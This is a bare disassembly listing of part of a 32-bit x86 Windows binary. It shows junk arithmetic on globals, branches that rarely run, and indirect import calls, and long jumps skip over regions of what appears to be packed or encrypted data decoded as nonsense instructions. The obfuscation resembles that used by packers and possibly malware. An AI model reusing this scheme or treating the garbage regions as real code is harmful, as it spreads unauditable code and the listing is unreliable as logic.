  401830:	mov    edi,DWORD PTR ds:0x428455
  401836:	or     DWORD PTR ds:0x4284ed,edi
  40183c:	or     DWORD PTR ds:0x428365,0x7336
  401846:	sbb    DWORD PTR ds:0x428469,0x42f3
  401850:	mov    DWORD PTR ds:0x428599,0x382b
  40185a:	inc    DWORD PTR ds:0x4285a1
  401860:	mov    DWORD PTR [ebp-0xc],eax
  401863:	mov    eax,ds:0x4225a0
  401868:	mov    ecx,DWORD PTR [ebp-0xc]
  40186b:	sbb    DWORD PTR ds:0x428485,0xc55
  401875:	mov    eax,DWORD PTR [eax]
  401877:	xor    edx,edi
  401879:	add    eax,DWORD PTR [ecx]
  40187b:	mov    edi,0x32de6d5d
  401880:	mov    ecx,DWORD PTR ds:0x428481
  401886:	sbb    DWORD PTR ds:0x42842d,ecx
  40188c:	mov    DWORD PTR [ebp-0x14],eax
  40188f:	cmp    DWORD PTR ds:0x428589,0x0
  401896:	not    ecx
  401898:	mov    DWORD PTR ds:0x428499,0x2a4e
  4018a2:	mov    edx,DWORD PTR ds:0x42856d
  4018a8:	jmp    0x401900
  4018ad:	mov    DWORD PTR ds:0x428359,0x4cb6
  4018b7:	mov    eax,0x4273
  4018bc:	cmp    DWORD PTR ds:0x428589,0x0
  4018c3:	jle    0x4018e8
  4018c9:	push   DWORD PTR [ebp-0x14]
  4018cc:	push   0x428185
  4018d1:	push   0x428211
  4018d6:	call   DWORD PTR ds:0x42e22c
  4018dc:	add    ecx,edx
  4018de:	or     DWORD PTR ds:0x428471,0x428491
  4018e8:	and    ecx,0x1796
  4018ee:	sub    edx,0x208e
  4018f4:	xor    DWORD PTR ds:0x428485,edx
  4018fa:	sub    DWORD PTR ds:0x42848d,ebx
  401900:	mov    eax,DWORD PTR [ebp+0x18]
  401903:	mov    ecx,DWORD PTR [ebp+0x1c]
  401906:	cmp    DWORD PTR ds:0x428439,0x0
  40190d:	movzx  edx,BYTE PTR ds:0x428435
  401914:	mov    edx,DWORD PTR ds:0x428511
  40191a:	movzx  edx,WORD PTR ds:0x428599
  401921:	jmp    0x401971
  401926:	mov    DWORD PTR ds:0x428585,0x405c
  401930:	cmp    DWORD PTR ds:0x428439,0x0
  401937:	jge    0x401961
  40193d:	push   DWORD PTR [ebp-0xc]
  401940:	push   DWORD PTR [ebp-0x14]
  401943:	push   0x1391
  401948:	push   0x7a4e
  40194d:	call   DWORD PTR ds:0x42e0a0
  401953:	neg    edx
  401955:	add    edx,0x51c2
  40195b:	sbb    edx,DWORD PTR ds:0x428385
  401961:	adc    DWORD PTR ds:0x428581,ecx
  401967:	sub    DWORD PTR ds:0x428385,0x3064
  401971:	shrd   eax,ecx,0x2
  401975:	shr    ecx,0x2
  401978:	cmp    DWORD PTR ds:0x428495,0x0
  40197f:	mov    ecx,DWORD PTR ds:0x42846d
  401985:	mov    ecx,0x3508
  40198a:	not    edx
  40198c:	jmp    0x4019d4
  401991:	mov    DWORD PTR ds:0x428575,edi
  401997:	mov    DWORD PTR ds:0x428459,0x1955
  4019a1:	cmp    DWORD PTR ds:0x428495,0x0
  4019a8:	je     0x4019cc
  4019ae:	push   0x428263
  4019b3:	push   0x400000
  4019b8:	call   DWORD PTR ds:0x42e0a4
  4019be:	neg    edx
  4019c0:	xor    DWORD PTR ds:0x428361,0x55e7
  4019ca:	sub    ecx,ecx
  4019cc:	not    ecx
  4019ce:	and    ecx,DWORD PTR ds:0x428461
  4019d4:	mov    ecx,DWORD PTR [ebp+0x18]
  4019d7:	mov    edx,DWORD PTR [ebp+0x1c]
  4019da:	add    DWORD PTR ds:0x4284fd,0x428589
  4019e4:	xor    eax,edi
  4019e6:	xor    edx,edx
  4019e8:	or     edx,eax
  4019ea:	and    eax,0x837
  4019ef:	mov    DWORD PTR [ebp-0x3c],edx
  4019f2:	jmp    0x401d93
  4019f7:	inc    DWORD PTR [edx+0x3c]
  4019fa:	pop    ebx
  4019fb:	mov    esp,0xf09aa0bb
  401a00:	fisubr DWORD PTR [edx+0x50d5ece3]
  401a06:	sahf   
  401a07:	mov    esi,0xbdbebecc
  401a0c:	les    edi,FWORD PTR [esi-0x2e35f42]
  401a12:	mov    edi,ecx
  401a14:	loope  0x401a7e
  401a16:	add    bl,dl
  401a18:	ja     0x401a78
  401a1a:	test   eax,0x32356551
  401a1f:	repnz les edx,FWORD PTR [eax+0x65bf5f21]
  401a26:	push   DWORD PTR ds:0xb839fae
  401a2c:	push   0xffffff9b
  401a2e:	jl     0x4019be
  401a30:	jecxz  0x4019c4
  401a32:	push   0x527747e
  401a37:	imul   ebp,DWORD PTR [ebp+0x36d25ceb],0xffffffba
  401a3e:	inc    eax
  401a3f:	pop    edi
  401a40:	xchg   edx,eax
  401a41:	daa    
  401a42:	and    ebx,esp
  401a44:	pop    ebp
  401a45:	out    dx,eax
  401a46:	fs inc eax
  401a48:	jp     0x401a46
  401a4a:	pushf  
  401a4b:	in     eax,dx
  401a4c:	mov    eax,0x2b84e963
  401a51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a52:	cmp    DWORD PTR [edx+0x72636912],ecx
  401a58:	sbb    eax,0xafdac58d
  401a5d:	aas    
  401a5e:	lods   eax,DWORD PTR ds:[esi]
  401a5f:	std    
  401a60:	sub    eax,0x62546810
  401a65:	sub    DWORD PTR [eax-0x13],ebp
  401a68:	pusha  
  401a69:	sub    al,0xfb
  401a6b:	lods   eax,DWORD PTR ds:[esi]
  401a6c:	out    0x10,al
  401a6e:	mov    esp,0x279b9681
  401a73:	in     al,0xe8
  401a75:	out    0x27,eax
  401a77:	out    dx,al
  401a78:	sub    eax,0x5c4097fb
  401a7d:	push   edi
  401a7e:	cmc    
  401a7f:	push   ebp
  401a80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a81:	push   cs
  401a82:	enter  0x3b74,0x2c
  401a86:	push   ds
  401a87:	jecxz  0x401a20
  401a89:	adc    DWORD PTR [edx-0x6f],eax
  401a8c:	jnp    0x401a6e
  401a8e:	in     eax,dx
  401a8f:	pop    ss
  401a90:	in     al,0xf5
  401a92:	test   al,0x8f
  401a94:	inc    esi
  401a95:	ret    0x73f0
  401a98:	mov    edi,0xb2eabe43
  401a9d:	imul   eax,DWORD PTR [ecx],0xffffff8f
  401aa0:	sahf   
  401aa1:	mov    ebx,0xc3039f39
  401aa6:	test   DWORD PTR [ebp+0x4ab0bde8],esi
  401aac:	in     eax,0x22
  401aae:	fcmovbe st,st(5)
  401ab0:	pop    ebp
  401ab1:	sti    
  401ab2:	inc    edx
  401ab3:	cmp    edi,eax
  401ab5:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ab7:	mov    DWORD PTR [edi],edi
  401ab9:	jmp    0x401ae6
  401abb:	xchg   DWORD PTR [ebp-0x30],esp
  401abe:	push   ebx
  401abf:	nop
  401ac0:	mov    edi,0x4635e23d
  401ac5:	pop    ebp
  401ac6:	xchg   ecx,eax
  401ac7:	inc    eax
  401ac8:	jecxz  0x401ac9
  401aca:	loopne 0x401a76
  401acc:	add    eax,0x16875e9d
  401ad1:	cmc    
  401ad2:	jb     0x401abd
  401ad4:	ror    BYTE PTR [ebp+0x48193bc5],cl
  401ada:	jl     0x401b32
  401adc:	ja     0x401adc
  401ade:	cmp    esp,edi
  401ae0:	mov    ebx,ecx
  401ae2:	pop    ebx
  401ae3:	in     eax,dx
  401ae4:	inc    ebp
  401ae5:	xlat   BYTE PTR ds:[ebx]
  401ae6:	repz or al,0xf
  401ae9:	in     al,0x76
  401aeb:	sub    DWORD PTR [ebp+0x12],edi
  401aee:	daa    
  401aef:	sbb    ecx,edi
  401af1:	lock jbe 0x401b07
  401af4:	lea    esi,[ecx+edi*8-0x79ddd35e]
  401afb:	inc    eax
  401afc:	dec    edi
  401afd:	pop    edi
  401afe:	cld    
  401aff:	out    0x27,eax
  401b01:	scas   al,BYTE PTR es:[edi]
  401b02:	leave  
  401b03:	mov    ebx,0x6d11e995
  401b08:	push   edi
  401b09:	in     eax,dx
  401b0a:	aam    0xed
  401b0c:	add    DWORD PTR [esi+0x6a],edx
  401b0f:	popa   
  401b10:	jp     0x401b77
  401b12:	out    dx,eax
  401b13:	jl     0x401ae3
  401b15:	addr16 mov bh,0x60
  401b18:	js     0x401b52
  401b1a:	xchg   esp,eax
  401b1b:	cmp    BYTE PTR [eax],dl
  401b1d:	jne    0x401b71
  401b1f:	imul   BYTE PTR [eax]
  401b21:	jns    0x401adc
  401b23:	daa    
  401b24:	and    BYTE PTR [edi+ebp*2+0x49d6f6b2],ch
  401b2b:	jmp    0x401b03
  401b2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b2e:	jnp    0x401b76
  401b30:	mov    cl,0xf6
  401b32:	(bad)  
  401b33:	xchg   ebx,eax
  401b34:	bt     edi,edx
  401b37:	dec    ecx
  401b38:	sub    bl,BYTE PTR [ebp+0x27]
  401b3b:	mov    edi,0xc996c58d
  401b40:	stc    
  401b41:	mov    al,0xc
  401b43:	push   ebx
  401b44:	or     DWORD PTR [eax+esi*8-0x785a6e9b],ebx
  401b4b:	lods   al,BYTE PTR ds:[esi]
  401b4c:	fisubr DWORD PTR [ebx+0x24]
  401b4f:	push   cs
  401b50:	int    0x5
  401b52:	sar    BYTE PTR [edx-0x4f],1
  401b55:	pop    ebx
  401b56:	fwait
  401b57:	push   edx
  401b58:	adc    BYTE PTR [edx+edi*4-0x3a],0xa4
  401b5d:	xor    eax,0x8ff2e1e4
  401b62:	sbb    DWORD PTR [edx+0x67],esi
  401b65:	push   ebp
  401b66:	xchg   ebx,eax
  401b67:	jmp    0xa83f1c25
  401b6c:	jo     0x401b22
  401b6e:	xchg   ecx,eax
  401b6f:	rcl    BYTE PTR [edi+ebp*1+0x7a],cl
  401b73:	not    DWORD PTR [ebx]
  401b75:	ins    DWORD PTR es:[edi],dx
  401b76:	sbb    ecx,DWORD PTR [eax]
  401b78:	js     0x401bb5
  401b7a:	push   ebp
  401b7b:	or     BYTE PTR [ecx],al
  401b7d:	aam    0xf0
  401b7f:	xor    esp,DWORD PTR [eax+0x2]
  401b82:	imul   ecx,DWORD PTR [eax-0x6a],0xa0e39804
  401b89:	cmp    bl,BYTE PTR [esi]
  401b8b:	jmp    0x401bcf
  401b8d:	les    esp,FWORD PTR [esi-0x67da6203]
  401b93:	pop    ebp
  401b94:	and    ch,BYTE PTR [ecx-0x52534b0a]
  401b9a:	jecxz  0x401bb4
  401b9c:	or     eax,esi
  401b9e:	sar    ah,1
  401ba0:	mov    edx,0xca60021f
  401ba5:	add    al,0xbb
  401ba7:	inc    eax
  401ba8:	mov    edi,0x34fa3c97
  401bad:	call   0x58909ad8
  401bb2:	pop    esi
  401bb3:	(bad)  
  401bb5:	into   
  401bb6:	nop
  401bb7:	mov    cl,0x71
  401bb9:	jb     0x401b56
  401bbb:	int3   
  401bbc:	add    cl,BYTE PTR [ebx]
  401bbe:	imul   DWORD PTR [esi]
  401bc0:	sbb    BYTE PTR [eax],dh
  401bc2:	out    0x49,eax
  401bc4:	loop   0x401bee
  401bc6:	and    bh,ch
  401bc8:	mul    DWORD PTR [edi]
  401bca:	stc    
  401bcb:	fimul  DWORD PTR [ebp+0x1694d540]
  401bd1:	int3   
  401bd2:	pop    ecx
  401bd3:	sub    eax,DWORD PTR [edi]
  401bd5:	in     al,dx
  401bd6:	cs (bad) 
  401bd8:	and    al,0x36
  401bda:	mov    dl,0x2a
  401bdc:	push   ebx
  401bdd:	dec    esp
  401bde:	stos   DWORD PTR es:[edi],eax
  401bdf:	out    0x51,eax
  401be1:	pop    edx
  401be2:	fst    QWORD PTR [ebp-0x25]
  401be5:	les    ebp,FWORD PTR ds:0x82a03714
  401beb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bec:	push   0x74
  401bee:	sub    al,0xe9
  401bf0:	int    0x49
  401bf2:	jne    0x401bed
  401bf4:	sbb    ch,bh
  401bf6:	pop    es
  401bf7:	adc    ebx,ebp
  401bf9:	mov    ebp,0xc81964f6
  401bfe:	stos   BYTE PTR es:[edi],al
  401bff:	arpl   WORD PTR [ebx-0x44020337],ax
  401c05:	cmp    eax,0x1f27cbfd
  401c0a:	(bad)  [esi]
  401c0c:	push   0xae299cfa
  401c11:	xor    al,bh
  401c13:	inc    ebx
  401c14:	jmp    0xa69a:0xa06a578f
  401c1b:	push   es
  401c1c:	xor    al,0x68
  401c1e:	addr16 dec ebx
  401c20:	sti    
  401c21:	or     eax,0x704ca9fc
  401c26:	mov    bh,0x5d
  401c28:	mov    edi,edi
  401c2a:	xor    DWORD PTR [ecx-0x48],ecx
  401c2d:	(bad)  
  401c2e:	mov    al,0xfc
  401c30:	iret   
  401c31:	data16 sbb BYTE PTR [ecx+0x45],ah
  401c35:	adc    al,0x9c
  401c37:	sbb    al,0xfe
  401c39:	int3   
  401c3a:	mov    bh,0x2e
  401c3c:	inc    esi
  401c3d:	ja     0x401c5f
  401c3f:	and    dh,BYTE PTR [ecx]
  401c41:	call   0xc8be407e
  401c46:	mov    bl,0x87
  401c48:	fcomp  DWORD PTR [esi]
  401c4a:	xchg   edi,eax
  401c4b:	pop    ebp
  401c4c:	xor    ah,BYTE PTR ds:0x594c3355
  401c52:	pusha  
  401c53:	jo     0x401bf0
  401c55:	add    eax,0x8cc91e54
  401c5a:	iret   
  401c5b:	repz push cs
  401c5d:	dec    ebp
  401c5e:	xchg   esi,eax
  401c5f:	rcl    BYTE PTR [esi+0x23],cl
  401c62:	jmp    0xb0fb:0xf842f248
  401c69:	xchg   DWORD PTR [edi],esp
  401c6b:	and    al,0x78
  401c6d:	pushf  
  401c6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c6f:	hlt    
  401c70:	ret    
  401c71:	sbb    bl,bl
  401c73:	xor    BYTE PTR [eax+0x70],al
  401c76:	repz cmp BYTE PTR [edx-0x1ca8bffe],0x63
  401c7e:	fstp   TBYTE PTR [esi]
  401c80:	jl     0x401cfc
  401c82:	xchg   DWORD PTR [edx-0x50],ebp
  401c85:	icebp  
  401c86:	stc    
  401c87:	xchg   esi,eax
  401c88:	jmp    0x401c1b
  401c8a:	stc    
  401c8b:	add    al,0xa5
  401c8d:	sbb    al,0xad
  401c8f:	dec    ecx
  401c90:	pop    ds
  401c91:	pop    esi
  401c92:	fbld   TBYTE PTR [esi]
  401c94:	int    0x65
  401c96:	into   
  401c97:	push   ss
  401c98:	mov    WORD PTR [ebx-0x6c0b075b],gs
  401c9e:	rol    BYTE PTR [ecx],1
  401ca0:	sub    ah,ch
  401ca2:	push   es
  401ca3:	cld    
  401ca4:	cmp    edi,DWORD PTR [edi-0x35]
  401ca7:	mov    ch,0x17
  401ca9:	pop    esp
  401caa:	push   ecx
  401cab:	and    eax,0x4ad5eee
  401cb0:	sti    
  401cb1:	test   BYTE PTR [ebx+0x62],bl
  401cb4:	and    al,0x16
  401cb6:	in     eax,0x55
  401cb8:	cdq    
  401cb9:	cmc    
  401cba:	cmc    
  401cbb:	pop    edx
  401cbc:	ja     0x401c46
  401cbe:	or     al,0x7e
  401cc0:	(bad)
  401cc4:	in     eax,dx
  401cc5:	adc    BYTE PTR [edx],ch
  401cc7:	test   dh,0xae
  401cca:	(bad)  
  401ccb:	sub    DWORD PTR [edi-0x5e],eax
  401cce:	push   ecx
  401ccf:	push   0x48cf4d66
  401cd4:	cmp    al,BYTE PTR [edi+ebp*4-0x681f7969]
  401cdb:	fbld   TBYTE PTR [esi+eiz*2]
  401cde:	loopne 0x401d47
  401ce0:	call   0x5962:0x6bfc34f8
  401ce7:	fstp   DWORD PTR [edi]
  401ce9:	adc    al,0x91
  401ceb:	lods   eax,DWORD PTR ds:[esi]
  401cec:	(bad)  
  401ced:	push   ebx
  401cee:	push   es
  401cef:	sub    ebx,esp
  401cf1:	push   edi
  401cf2:	xchg   esp,eax
  401cf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cf4:	adc    DWORD PTR [eax],esi
  401cf6:	jmp    0x88fe:0x11cad9f9
  401cfd:	(bad)  
  401cfe:	stc    
  401cff:	and    esi,esi
  401d01:	sub    al,0x88
  401d03:	fucomi st,st(4)
  401d05:	dec    ebp
  401d06:	inc    ecx
  401d07:	xlat   BYTE PTR ds:[ebx]
  401d08:	lods   eax,DWORD PTR ds:[esi]
  401d09:	and    dh,ah
  401d0b:	jbe    0x401d32
  401d0d:	scas   eax,DWORD PTR es:[edi]
  401d0e:	fsub   DWORD PTR [ebp*1+0x129bc53a]
  401d15:	adc    eax,0x4b01ef1b
  401d1a:	clc    
  401d1b:	outs   dx,DWORD PTR ds:[esi]
  401d1c:	adc    eax,0xc176c22a
  401d21:	mov    edx,eax
  401d23:	aas    
  401d24:	mov    ecx,0x5e85d570
  401d29:	scas   eax,DWORD PTR es:[edi]
  401d2a:	rol    DWORD PTR [edi+esi*8-0x11],1
  401d2e:	mov    dl,0x72
  401d30:	pushf  
  401d31:	test   DWORD PTR [ebx],ebx
  401d33:	aaa    
  401d34:	hlt    
  401d35:	pop    esi
  401d36:	(bad)  [edx]
  401d38:	adc    al,0x97
  401d3a:	xor    eax,0x563c5213
  401d3f:	xor    eax,0x2740a981
  401d44:	mov    eax,0xa94a8628
  401d49:	mov    edx,0x8b25f185
  401d4e:	push   edi
  401d4f:	sub    al,0xb0
  401d51:	jle    0x401d70
  401d53:	xchg   esp,eax
  401d54:	lds    esp,FWORD PTR [edx+0x56]
  401d57:	out    dx,al
  401d58:	sbb    al,0xad
  401d5a:	int    0x24
  401d5c:	mov    fs,WORD PTR [edx-0x4bd5b1dd]
  401d62:	push   esi
  401d63:	xchg   bx,ax
  401d65:	and    BYTE PTR [ecx+0x7c0c77c3],al
  401d6b:	scas   al,BYTE PTR es:[edi]
  401d6c:	jge    0x401d70
  401d6e:	in     eax,dx
  401d6f:	neg    bl
  401d71:	ret    
  401d72:	outs   dx,DWORD PTR ds:[esi]
  401d73:	jb     0x401daa
  401d75:	mov    edx,0xd26902cd
  401d7a:	or     al,dh
  401d7c:	xchg   esi,eax
  401d7d:	jnp    0x401de7
  401d7f:	lods   al,BYTE PTR ds:[esi]
  401d80:	sti    
  401d81:	call   eax
  401d83:	cwde   
  401d84:	or     DWORD PTR [eax-0x6e],esp
  401d87:	jg     0x401d79
  401d89:	mov    al,ds:0xf25848a5
  401d8e:	mov    dl,0xf9
  401d90:	ja     0x401d94
  401d92:	rol    edi,1
  401d94:	inc    ebp
  401d95:	nop
  401d96:	push   ebp
  401d97:	sub    al,0x0
  401d99:	add    bh,al
  401d9b:	inc    ebp
  401d9c:	xchg   esp,eax
  401d9d:	outs   dx,DWORD PTR ds:[esi]
  401d9e:	inc    ebp
  401d9f:	add    BYTE PTR [eax],al
  401da1:	mov    DWORD PTR [ebp-0x70],0x78a6
  401da8:	mov    DWORD PTR [ebp-0x6c],0x188
  401daf:	sbb    DWORD PTR ds:0x428445,ecx
  401db5:	mov    DWORD PTR [ebp-0x70],0x5b3f
  401dbc:	mov    DWORD PTR [ebp-0x6c],0x3219
  401dc3:	add    DWORD PTR ds:0x42857d,0x3158
  401dcd:	mov    DWORD PTR [ebp-0x70],0x231c
  401dd4:	add    eax,DWORD PTR ds:0x42842d
  401dda:	mov    DWORD PTR [ebp-0x6c],0x1337
  401de1:	sub    DWORD PTR ds:0x428391,edx
  401de7:	mov    DWORD PTR [ebp-0x70],0x7593
  401dee:	mov    DWORD PTR [ebp-0x6c],0x11b8
  401df5:	movzx  eax,BYTE PTR ds:0x42836d
  401dfc:	and    DWORD PTR ds:0x428595,eax
  401e02:	mov    DWORD PTR [ebp-0x70],0x3b72
  401e09:	mov    DWORD PTR [ebp-0x6c],0x3abc
  401e10:	cmp    DWORD PTR ds:0x428435,0x0
  401e17:	mov    DWORD PTR ds:0x42856d,0x646
  401e21:	mov    DWORD PTR ds:0x428445,0x14a3
  401e2b:	jmp    0x401eb8
  401e30:	movzx  eax,WORD PTR ds:0x428511
  401e37:	mov    DWORD PTR ds:0x428435,ebx
  401e3d:	cmp    DWORD PTR ds:0x428435,0x0
  401e44:	jle    0x401e86
  401e4a:	push   DWORD PTR [ebp-0x20]
  401e4d:	push   0x428263
  401e52:	push   0x428167
  401e57:	push   0x400000
  401e5c:	call   DWORD PTR ds:0x42e230
  401e62:	xor    DWORD PTR ds:0x42856d,0x4536
  401e6c:	sub    DWORD PTR ds:0x4284f5,edi
  401e72:	sbb    DWORD PTR ds:0x42845d,0x42856d
  401e7c:	add    DWORD PTR ds:0x428485,0x5ddd
  401e86:	sbb    DWORD PTR ds:0x428595,0x428445
  401e90:	adc    DWORD PTR ds:0x428589,0x5ea9
  401e9a:	sub    DWORD PTR ds:0x428579,0x428565
  401ea4:	add    DWORD PTR ds:0x428365,0x5dac
  401eae:	add    DWORD PTR ds:0x42835d,0x46fc
  401eb8:	mov    DWORD PTR [ebp-0x68],0x1b45
  401ebf:	xor    DWORD PTR ds:0x428451,edx
  401ec5:	mov    DWORD PTR [ebp-0x64],0x767d
  401ecc:	or     DWORD PTR ds:0x42856d,edi
  401ed2:	mov    DWORD PTR [ebp-0x60],0x1d973857
  401ed9:	mov    DWORD PTR [ebp-0x5c],0x0
  401ee0:	mov    DWORD PTR [ebp-0x34],0x599d
  401ee7:	xor    eax,DWORD PTR ds:0x4284e5
  401eed:	mov    DWORD PTR [ebp-0x2c],0x165d
  401ef4:	mov    DWORD PTR [ebp-0x1c],0xc51
  401efb:	xor    eax,eax
  401efd:	add    eax,DWORD PTR ds:0x428379
  401f03:	or     eax,DWORD PTR ds:0x428455
  401f09:	mov    ds:0x428379,eax
  401f0e:	mov    DWORD PTR [ebp-0x44],0x3f55
  401f15:	cmp    DWORD PTR ds:0x42857d,0x0
  401f1c:	mov    DWORD PTR ds:0x428355,0xd43
  401f26:	mov    DWORD PTR ds:0x428599,0x5a6d
  401f30:	mov    DWORD PTR ds:0x42843d,edx
  401f36:	jmp    0x40200c
  401f3b:	mov    eax,0x36f8
  401f40:	mov    DWORD PTR ds:0x428495,edx
  401f46:	cmp    DWORD PTR ds:0x42857d,0x0
  401f4d:	jg     0x401f82
  401f53:	push   0x4521
  401f58:	push   0x4861
  401f5d:	push   DWORD PTR [ebp-0x20]
  401f60:	push   0x428258
  401f65:	push   DWORD PTR [ebp-0x28]
  401f68:	call   DWORD PTR ds:0x42e0a8
  401f6e:	adc    DWORD PTR ds:0x428465,0x7cd6
  401f78:	sbb    DWORD PTR ds:0x428511,0xfa0
  401f82:	adc    DWORD PTR ds:0x428471,0x42835d
  401f8c:	add    DWORD PTR ds:0x428379,0x428491
  401f96:	cmp    DWORD PTR ds:0x42856d,0x0
  401f9d:	mov    DWORD PTR ds:0x428495,0x6252
  401fa7:	mov    DWORD PTR ds:0x428391,0x40d0
  401fb1:	jmp    0x40200c
  401fb6:	mov    DWORD PTR ds:0x428575,edx
  401fbc:	cmp    DWORD PTR ds:0x42856d,0x0
  401fc3:	ja     0x401fee
  401fc9:	push   0x428185
  401fce:	call   DWORD PTR ds:0x42e234
  401fd4:	and    DWORD PTR ds:0x42837d,0x428519
  401fde:	sbb    DWORD PTR ds:0x428459,0x5068
  401fe8:	xor    DWORD PTR ds:0x428511,edi
  401fee:	and    DWORD PTR ds:0x428501,0x42859d
  401ff8:	xor    DWORD PTR ds:0x428519,0x428595
  402002:	add    DWORD PTR ds:0x428565,0xd3c
  40200c:	mov    DWORD PTR [ebp-0x44],0x1
  402013:	mov    DWORD PTR [ebp-0x44],0x42e8
  40201a:	mov    eax,DWORD PTR [ebp-0x60]
  40201d:	add    DWORD PTR ds:0x428375,0x4284ed
  402027:	shl    ecx,0x1e
  40202a:	mov    ecx,DWORD PTR [ebp-0x5c]
  40202d:	add    DWORD PTR ds:0x4284f5,0x5f4
  402037:	push   ecx
  402038:	adc    DWORD PTR ds:0x42851d,0x428369
  402042:	push   eax
  402043:	or     DWORD PTR ds:0x428521,0x4284fd
  40204d:	push   0xddf
  402052:	sbb    DWORD PTR ds:0x428381,0x218d
  40205c:	jmp    0x4023fd
  402061:	mov    ebp,0x2b7a2504
  402066:	jl     0x401ffa
  402068:	mov    esp,0x9e22191a
  40206d:	jae    0x402066
  40206f:	stos   BYTE PTR es:[edi],al
  402070:	jecxz  0x40202f
  402072:	sar    BYTE PTR [esi-0x413b4242],cl
  402078:	mov    esi,0x927a923e
  40207d:	shl    ch,cl
  40207f:	and    eax,0x5cd31b
  402084:	fwait
  402085:	inc    eax
  402086:	or     DWORD PTR [edx],edi
  402088:	daa    
  402089:	aad    0xad
  40208b:	in     al,0xb5
  40208d:	jle    0x402047
  40208f:	cs xchg ecx,eax
  402091:	sbb    al,0xf4
  402093:	out    dx,eax
  402094:	iret   
  402095:	inc    BYTE PTR [edx]
  402097:	sub    DWORD PTR [ebp+0x49],0xffffffc1
  40209b:	ins    DWORD PTR es:[edi],dx
  40209c:	jae    0x4020ef
  40209e:	push   esp
  40209f:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4020a1:	pop    ebp
  4020a2:	out    dx,al
  4020a3:	test   eax,0x223240c5
  4020a8:	mov    dh,0xcf
  4020aa:	mov    ebx,0xe899e308
  4020af:	inc    eax
  4020b0:	ficom  WORD PTR [edx+0x7b]
  4020b3:	iret   
  4020b4:	inc    ebx
  4020b5:	retf   
  4020b6:	or     eax,0xa4dcd898
  4020bb:	xor    ebx,DWORD PTR [ebp+0xdff2a5c]
  4020c1:	cmp    al,0x24
  4020c3:	jb     0x402115
  4020c5:	pop    esp
  4020c6:	or     BYTE PTR [esi],ch
  4020c8:	jl     0x40211a
  4020ca:	cmp    eax,0x6d69d2ad
  4020cf:	xor    al,0x57
  4020d1:	push   0xef3362a
  4020d6:	int    0xfa
  4020d8:	outs   dx,DWORD PTR ds:[esi]
  4020d9:	or     esp,DWORD PTR [eax-0x33]
  4020dc:	aad    0x4a
  4020de:	pop    ecx
  4020df:	dec    esp
  4020e0:	inc    esp
  4020e1:	repz and al,0x4f
  4020e4:	inc    ebp
  4020e5:	lock jmp 0x24925725
  4020eb:	xchg   DWORD PTR [edi-0x6161e67c],eax
  4020f1:	ss call 0x61b5:0xe2703c3c
  4020f9:	in     al,0x8b
  4020fb:	jb     0x40214d
  4020fd:	scas   eax,DWORD PTR es:[edi]
  4020fe:	xor    ah,BYTE PTR [edx+edx*8-0x4]
  402102:	iret   
  402103:	or     al,0xf9
  402105:	add    al,0x4d
  402107:	std    
  402108:	cwde   
  402109:	rol    bh,0x1f
  40210c:	add    dl,BYTE PTR ds:0x7112bb2a
  402112:	in     al,dx
  402113:	xor    ebx,ebx
  402115:	sub    BYTE PTR [ecx+ebx*8],al
  402118:	iret   
  402119:	adc    DWORD PTR [edx+ebx*1-0x25],esp
  40211d:	(bad)  
  40211e:	mov    edx,0xd5e622c2
  402123:	pop    ebx
  402124:	jp     0x4020af
  402126:	xchg   esi,eax
  402127:	rcl    BYTE PTR [esi+0x37],cl
  40212a:	popf   
  40212b:	pushf  
  40212c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40212d:	mov    BYTE PTR [esi+ebp*1],0x53
  402131:	jb     0x4021b0
  402133:	sbb    cl,BYTE PTR [esi]
  402135:	sub    dl,al
  402137:	std    
  402138:	mov    bh,0x41
  40213a:	cmp    eax,esi
  40213c:	stos   BYTE PTR es:[edi],al
  40213d:	ja     0x40214d
  40213f:	cs push ss
  402141:	leave  
  402142:	test   BYTE PTR [ecx+0x32455246],0xe9
  402149:	fs popa 
  40214b:	clc    
  40214c:	outs   dx,DWORD PTR ds:[esi]
  40214d:	xchg   edi,eax
  40214e:	sbb    ch,BYTE PTR [edi]
  402150:	add    DWORD PTR [ecx-0x20],ecx
  402153:	je     0x402118
  402155:	or     bl,al
  402157:	cmp    BYTE PTR [ebx+0x7f],ch
  40215a:	xchg   ecx,eax
  40215b:	push   0x51adc5f4
  402160:	push   edx
  402161:	or     al,0x0
  402163:	fldcw  WORD PTR [esi]
  402165:	lods   al,BYTE PTR ds:[esi]
  402166:	push   edi
  402167:	push   ecx
  402168:	jmp    FWORD PTR [edi+0x74abb7e6]
  40216e:	in     eax,dx
  40216f:	xor    eax,0xffffff9d
  402172:	lods   al,BYTE PTR ds:[esi]
  402173:	ror    dl,cl
  402175:	push   cs
  402176:	dec    eax
  402177:	test   BYTE PTR [edx],0x8a
  40217a:	aas    
  40217b:	mov    ds:0xd2265705,al
  402180:	push   edx
  402181:	iret   
  402182:	dec    edi
  402183:	hlt    
  402184:	imul   esi,DWORD PTR [ecx],0x50
  402187:	dec    esp
  402188:	mov    DWORD PTR [edx-0x56],0xb5a0b2bf
  40218f:	outs   dx,DWORD PTR ds:[esi]
  402190:	popf   
  402191:	jg     0x4021e7
  402193:	inc    edx
  402194:	cmc    
  402195:	daa    
  402196:	sbb    eax,0x23016728
  40219b:	cli    
  40219c:	popf   
  40219d:	mov    dl,0x4b
  40219f:	push   0x5c
  4021a1:	pop    ebx
  4021a2:	not    BYTE PTR [eax+eax*1]
  4021a5:	xchg   edx,eax
  4021a6:	add    bl,bh
  4021a8:	hlt    
  4021a9:	loop   0x402178
  4021ab:	inc    edi
  4021ac:	call   0xce85:0xe09eab4
  4021b3:	cli    
  4021b4:	imul   esi,esi,0xd54f27ad
  4021ba:	outs   dx,DWORD PTR ds:[esi]
  4021bb:	sbb    eax,0x799d55c6
  4021c0:	lea    ebp,[ebx+0x49e63afd]
  4021c6:	cmp    dl,bl
  4021c8:	inc    edi
  4021c9:	add    edx,DWORD PTR [eax]
  4021cb:	cmp    ebx,DWORD PTR [edx]
  4021cd:	xchg   DWORD PTR [ebp-0x62],ebx
  4021d0:	addr16 add ebx,eax
  4021d3:	retf   0x98d7
